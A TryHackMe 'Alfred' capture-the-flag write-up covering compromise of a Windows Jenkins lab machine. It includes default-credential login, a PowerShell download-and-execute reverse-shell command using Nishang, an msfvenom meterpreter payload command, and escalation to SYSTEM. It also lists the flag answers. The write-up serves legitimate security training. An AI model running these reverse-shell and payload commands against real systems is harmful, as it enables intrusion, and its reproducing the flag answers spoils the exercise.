**Room Link**: [https://tryhackme.com/room/alfred](https://tryhackme.com/room/alfred)  
**Difficulty**: Easy 
**Platform**: Windows 
**Author**: Ry@n

---
## Overview

This room presents a Windows machine running Jenkins. The challenge includes exploiting Jenkins for initial access and escalating privileges via a misconfigured Windows service.

---
# Task 1: Initial Access
## 1. How many ports are open? (TCP only):
- Answer: 3
	- Because this machine does not respond to ping (ICMP) so we have to use this command : `nmap -sC -sV -Pn 10.201.99.33`
	![Pasted image 20250817002954](images/Pasted%20image%2020250817002954.png)
	- We have 3 TCP port open
## 2.What is the username and password for the login panel? (in the format username:password)
- Answer: admin:admin
	- To find the credential we have alot of ways(Hydra,burp suite,...), but of me i guess it in the first time :DDD
	![Pasted image 20250817003356](images/Pasted%20image%2020250817003356.png)
## 3.What is the user.txt flag?
- Answer: 79007a09481963edf2e1321abd9ae2a0
	- To find the flag we need a reverse shell in the machine, i will use nishang to get a reverse shell
	![Pasted image 20250817003720](images/Pasted%20image%2020250817003720.png)
	- Ok now we need to find a way to put a shell in the machine, luckily we have admin access on the Jenkins website
	![Pasted image 20250817004021](images/Pasted%20image%2020250817004021.png)
	- So now we can use this to make that happen, but remember to set up a python server and a listener
	![Pasted image 20250817004223](images/Pasted%20image%2020250817004223.png)
	![Pasted image 20250817004245](images/Pasted%20image%2020250817004245.png)
	- here is the config to make the server connect to our server so download the payload  
	`powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.127.243:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.127.243 -Port 4444`
	![Pasted image 20250817004608](images/Pasted%20image%2020250817004608.png)
	- After hit build you should get a reverse shell back to your machine 
	![Pasted image 20250817004724](images/Pasted%20image%2020250817004724.png)
	![Pasted image 20250817004738](images/Pasted%20image%2020250817004738.png)
	- Now we have access to the system let find the flag
	![Pasted image 20250817004848](images/Pasted%20image%2020250817004848.png)
	- OK that is our flag
# Task 2: Switching Shells
## 1.What is the final size of the exe payload that you generated?
- Answer: 73802
	- To make the privilege escalation easier, let's switch to a meterpreter shell using metasspolit
	- Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
		`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.127.243 LPORT=5555 -f exe -o payload.exe`
	![Pasted image 20250817005540](images/Pasted%20image%2020250817005540.png)
	- We can see that the size of the payload is 73802 bytes
	- Now we need to put the payload in the machine using the previous method
	![Pasted image 20250817010516](images/Pasted%20image%2020250817010516.png)
	- `powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.4.127.243:8080/payload.exe', 'payload.exe')"`
	- before use that payload on the machine make sure that you have a handler is set up in Metasploit
	![Pasted image 20250817010902](images/Pasted%20image%2020250817010902.png)
	- Now let execute the payload
	![Pasted image 20250817011044](images/Pasted%20image%2020250817011044.png)
	- You should have a shell spawn in 
	![Pasted image 20250817011125](images/Pasted%20image%2020250817011125.png)
# Task 3: Privilege Escalation
## 1.Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators' token. What is the output when you run the getuid command?
- Answer:NT AUTHORITY\SYSTEM
	- first i use `getsystem` to attempt to escalate from the current user alfred\bruce to NT AUTHORITY\SYSTEM
	![Pasted image 20250817012233](images/Pasted%20image%2020250817012233.png)
	- This show that it was success
	- now i need to find a processes running under NT AUTHORITY\SYSTEM
	![Pasted image 20250817012349](images/Pasted%20image%2020250817012349.png)
	- Now i will migrate to process 668 to stabilize the session and Bypass user-level restrictions
	- Now we have root access
	![Pasted image 20250817012600](images/Pasted%20image%2020250817012600.png)
## 2.Read the root.txt file located at C:\Windows\System32\config
- Answer:��dff0f748678f280250f25a45b8046b4a

